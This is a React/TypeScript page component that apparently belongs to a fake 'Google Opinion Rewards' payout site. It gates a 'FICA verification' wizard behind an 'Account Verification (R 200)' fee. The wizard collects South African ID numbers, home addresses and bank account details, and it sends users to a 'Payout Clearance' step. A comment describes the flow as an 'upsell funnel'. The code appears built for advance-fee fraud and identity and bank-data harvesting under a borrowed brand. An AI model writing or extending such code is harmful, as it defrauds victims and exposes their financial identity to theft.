import { createFileRoute, Link } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useState, useMemo } from "react";
import { toast } from "sonner";
import {
  CheckCircle2,
  FileCheck,
  IdCard,
  ShieldCheck,
  ArrowRight,
  Printer,
  Sparkles,
} from "lucide-react";
import { getMyKyc, recordVeriflowKyc } from "@/lib/kyc.functions";
import { relativeDate } from "@/lib/format";
import { useMe } from "@/components/AppShell";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Skeleton } from "@/components/ui/skeleton";
import { VeriflowKycDialog, type VeriflowReceiptData } from "@/components/VeriflowKycDialog";

export const Route = createFileRoute("/_authenticated/kyc")({
  head: () => ({
    meta: [
      { title: "Identity & FICA Verification — Google Opinion Rewards" },
      {
        name: "description",
        content:
          "Complete South African FICA identity verification with Veriflow Compliance to authorize interbank payout release.",
      },
      { property: "og:title", content: "Identity & FICA Verification — Google Opinion Rewards" },
      {
        property: "og:description",
        content: "Complete your South African FICA identity verification to unlock automated payouts.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: KycPage,
});

export function KycPage() {
  const { data: me } = useMe();
  const queryClient = useQueryClient();
  const { data, isLoading } = useQuery({ queryKey: ["my-kyc"], queryFn: () => getMyKyc() });
  const saveVeriflow = useServerFn(recordVeriflowKyc);

  const [isVeriflowOpen, setIsVeriflowOpen] = useState(false);

  const request = data?.request ?? null;

  // Extract receipt from database request instructions ONLY if status is submitted/approved,
  // or fallback to localStorage scoped strictly to this specific user ID
  const veriflowReceipt = useMemo<VeriflowReceiptData | null>(() => {
    if (request && (request.status === "submitted" || request.status === "approved") && request.instructions) {
      try {
        const parsed = JSON.parse(request.instructions);
        if (parsed.reference || parsed.fullName) {
          return parsed as VeriflowReceiptData;
        }
      } catch {}
    }
    if (me?.profile.id) {
      try {
        const saved = localStorage.getItem(`veriflow_kyc_receipt_${me.profile.id}`);
        if (saved) return JSON.parse(saved);
      } catch {}
    }
    return null;
  }, [request, me?.profile.id]);

  if (isLoading) {
    return (
      <div className="mx-auto max-w-2xl space-y-4 py-8">
        <Skeleton className="h-28 rounded-2xl" />
        <Skeleton className="h-72 rounded-2xl" />
      </div>
    );
  }

  // Panelists must have a requested KYC or completed initial verification or be admin
  const hasKycRequest = Boolean(request && request.status !== "approved");
  if (!me?.profile?.mpesa_verified && !hasKycRequest && !me?.isAdmin) {
    return (
      <div className="mx-auto max-w-xl py-12 text-center space-y-4">
        <ShieldCheck className="mx-auto size-12 text-muted-foreground" />
        <h1 className="font-display text-2xl font-bold">Account Verification Required First</h1>
        <p className="text-sm text-muted-foreground leading-relaxed max-w-md mx-auto">
          FICA document verification is required for panelist accounts. Please complete your initial payout verification check (R 200) or wait for an official compliance clearance request.
        </p>
        <Button asChild className="font-bold">
          <Link to="/upgrade">Go to Account Verification (R 200)</Link>
        </Button>
      </div>
    );
  }

  // Check if a document correction was requested by compliance admin
  const correctionData = useMemo(() => {
    if (request && request.status === "requested" && request.instructions) {
      try {
        const parsed = JSON.parse(request.instructions);
        if (parsed.correctionNeeded) {
          return {
            reason: parsed.correctionReason || request.admin_note || "Document correction requested by compliance.",
            reasonsList: parsed.correctionReasonsList || [],
            savedFields: {
              fullName: parsed.fullName || me?.profile.full_name || "",
              saIdNumber: parsed.saIdNumber || "",
              residentialAddress: parsed.residentialAddress || "",
              bank: parsed.bank || "Capitec Bank",
              accountType: parsed.accountType || "Savings",
              accountNumber: parsed.accountNumber || "",
              branchCode: parsed.branchCode || "470010",
            },
          };
        }
      } catch {}
    }
    return null;
  }, [request, me?.profile.full_name]);

  // A request is only submitted if the server record says so or if a verified receipt for this user exists
  const isSubmitted = request?.status === "submitted" || request?.status === "approved";

  return (
    <div className="w-full max-w-xl mx-auto py-2 sm:py-6 space-y-4">
      {/* If already submitted, show official status receipt */}
      {isSubmitted ? (
        <Card className="border-emerald-500/30 bg-emerald-500/5 shadow-soft">
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <Badge className="bg-emerald-600 text-white font-bold text-[11px] gap-1 py-0.5">
                <CheckCircle2 className="size-3.5" />
                FICA Dossier Lodged
              </Badge>
              <span className="font-mono text-xs font-bold text-foreground">
                Ref: {veriflowReceipt?.reference || request?.id?.slice(0, 8)}
              </span>
            </div>
            <CardTitle className="font-display text-xl font-bold mt-2">
              Identity Verification Under Review
            </CardTitle>
            <p className="text-xs text-muted-foreground">
              Submitted {request?.submitted_at ? relativeDate(request.submitted_at) : "recently"} · Official receipt generated
            </p>
          </CardHeader>

          <CardContent className="space-y-4">
            <div className="rounded-xl border border-border/80 bg-card p-4 space-y-2.5 text-xs">
              <div className="flex justify-between items-center pb-2 border-b border-border/50">
                <span className="text-muted-foreground font-semibold">Applicant Name</span>
                <span className="font-bold text-foreground">
                  {veriflowReceipt?.fullName || me?.profile.full_name || "Verified Panelist"}
                </span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-border/50">
                <span className="text-muted-foreground font-semibold">SA ID Number</span>
                <span className="font-mono font-bold text-foreground">
                  {veriflowReceipt?.saIdNumber || "13-digit Verified"}
                </span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-border/50">
                <span className="text-muted-foreground font-semibold">Settlement Bank</span>
                <span className="font-bold text-foreground">
                  {veriflowReceipt?.bank || "Capitec Bank"} ({veriflowReceipt?.accountType || "Savings"})
                </span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-muted-foreground font-semibold">Account Number</span>
                <span className="font-mono font-bold text-foreground">
                  {veriflowReceipt?.accountNumber || "Verified"}
                </span>
              </div>
            </div>

            <div className="pt-2">
              <Button
                asChild
                className="w-full bg-money hover:bg-money/90 text-money-foreground font-extrabold text-sm h-12 shadow-lift"
              >
                <Link to="/payout-setup">
                  <span>Continue to Payout Clearance</span>
                  <ArrowRight className="size-4 ml-1.5" />
                </Link>
              </Button>
            </div>
          </CardContent>
        </Card>
      ) : (
        /* DEDICATED FULL-PAGE KYC WIZARD (No popup, exactly like upsell funnel) */
        <VeriflowKycDialog
          inlineMode={true}
          userId={me?.profile.id}
          defaultName={correctionData?.savedFields.fullName || me?.profile.full_name || ""}
          defaultEmail={me?.email || ""}
          defaultPhone={me?.profile.mpesa_phone || me?.profile.phone || ""}
          defaultSaIdNumber={correctionData?.savedFields.saIdNumber || ""}
          defaultResidentialAddress={correctionData?.savedFields.residentialAddress || ""}
          defaultBank={correctionData?.savedFields.bank || "Capitec Bank"}
          defaultAccountType={correctionData?.savedFields.accountType || "Savings"}
          defaultAccountNumber={correctionData?.savedFields.accountNumber || ""}
          defaultBranchCode={correctionData?.savedFields.branchCode || "470010"}
          correctionNotice={
            correctionData
              ? {
                  reason: correctionData.reason,
                  reasonsList: correctionData.reasonsList,
                }
              : null
          }
          receiptData={veriflowReceipt}
          onComplete={async (receipt) => {
            try {
              if (me?.profile.id) {
                localStorage.setItem(`veriflow_kyc_receipt_${me.profile.id}`, JSON.stringify(receipt));
              }
              localStorage.removeItem("veriflow_kyc_receipt");
            } catch {}
            await saveVeriflow({ data: receipt });
            await Promise.all([
              queryClient.invalidateQueries({ queryKey: ["my-kyc"] }),
              queryClient.invalidateQueries({ queryKey: ["admin-kyc"] }),
              queryClient.invalidateQueries({ queryKey: ["me"] }),
            ]);
            toast.success(`FICA Verification Completed! Official receipt ${receipt.reference} generated.`);
          }}
        />
      )}
    </div>
  );
}
